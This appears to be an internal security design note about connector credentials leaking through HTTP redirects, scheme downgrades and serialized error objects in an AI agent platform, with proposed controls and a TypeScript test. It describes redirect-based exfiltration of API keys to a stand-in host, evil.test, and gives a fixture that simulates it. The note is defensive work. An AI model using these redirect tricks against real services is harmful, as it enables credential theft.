# design-16: connector auth headers leak through redirects and error objects

**Severity:** High. **Surface:** connector and `fetch` HTTP clients, MCP Streamable HTTP, tool error results, logs. **Docs:** 05 §4.6 (Connectors: "stripped on cross-host redirects"), §4.4 (`api_key` with a header name), §14 (logs); 04 §6 (`{token, headerName}`). **Owners:** S09, S06, S01.

## Attack

1. **Custom headers survive redirects.** `api_key` items inject a *custom* header (`headerName`: `X-Api-Key`, `PRIVATE-TOKEN`, `X-Auth-Token`). Node's built-in `fetch` (undici) strips only `authorization`, `proxy-authorization` and `cookie` on a cross-origin redirect (verified on Node 24: `X-Api-Key` reached the new host for 301, 302, 303, 307 and 308). A user-configured "custom HTTP connector", or any API that returns a redirect the attacker can influence (for example a `?next=` open redirect, a `Location` taken from user-uploaded file metadata, or a compromised CDN `302`), receives the secret at `https://evil.test`. 307/308 also keep the method and body. 301 and 302 rewrite only POST to GET; PUT and DELETE keep their body.
2. **Same host, different port or scheme.** "Bound host only, HTTPS only": a redirect from `https://api.example.com` to `http://api.example.com` or to `https://api.example.com:8443` keeps the host but changes origin. undici treats a port change as cross-origin, but a scheme downgrade to `http:` on the same host keeps the headers if the policy compares hosts only.
3. **Errors that carry the request.** Common clients put the request in their errors: axios `err.config.headers.Authorization`, `got`'s `err.options.headers`, the Google APIs client's `GaxiosError.config`, the AI SDK's `APICallError.requestBodyValues` (and `responseHeaders`, which can echo tokens). If a tool returns `String(err)` or `JSON.stringify(err)` as the tool result, or the logger writes `err` with its own serializer, the secret ends up in model context, `logs/` and the audit `data`. `ResolvedSecret` is redacted only while it is still a `ResolvedSecret`; once `use(v => headers["X-Api-Key"] = v)` has run, the plain string sits in the headers object that the error captured.
4. **Provider error echo.** Some APIs return "invalid key `sk-…abcd`" with part or all of the key. A tool result passing the provider's error body through contains it.

## Assumption broken

"Stripped on cross-host redirects" assumes the HTTP library does it. It does so only for three standard header names, and only by origin.

## Proposed control

- Connector HTTP clients use `redirect: "manual"`. Each hop is re-evaluated: it must be the same **origin** (scheme, host, port) as the binding to keep *any* credential header; otherwise all secret-bearing headers are dropped and the hop is a new-origin decision. Downgrades to `http:` are refused.
- Errors that cross the executor boundary are rebuilt from an allowlisted shape `{status, code, providerMessage: redact(fuzzy(...))}`, never serialized from the library's error object. The logger has a serializer that drops `config`, `options`, `request`, `headers` and `requestBodyValues`.
- Every tool result, log line and audit `data` passes through `redact()`, which the broker seeds with all values resolved in the current process lifetime (not only this turn), plus a 6-character prefix/suffix match for keys longer than 20 characters.

## Test case

```ts
const evil = await fixtureServer("evil.test");                   // records request headers
const api = await fixtureServer("api.example.test", { "/v1/me": { status: 307, location: evil.url("/x") } });
creds.add({ slug: "ex-key", kind: "api_key", bindings: [{ host: "api.example.test" }], secret: FAKE_KEY, header: "X-Api-Key" });
const res = await connectors.http.request({ url: api.url("/v1/me"), auth: "{{cred:ex-key.header}}" }, approved);
expect(evil.requests.flatMap((r) => Object.values(r.headers))).not.toContain(FAKE_KEY);

const failing = await fixtureServer("api.example.test", { "/v1/me": { status: 401, body: `bad key ${FAKE_KEY}` } });
const r = await tools.call("mcp__example__me", {}, approvedCtx);
for (const sink of [JSON.stringify(r), logs.text(), audit.text(), transcript.text()]) {
  expect(sink).not.toContain(FAKE_KEY);
  expect(sink).not.toContain(FAKE_KEY.slice(-12));
}
```
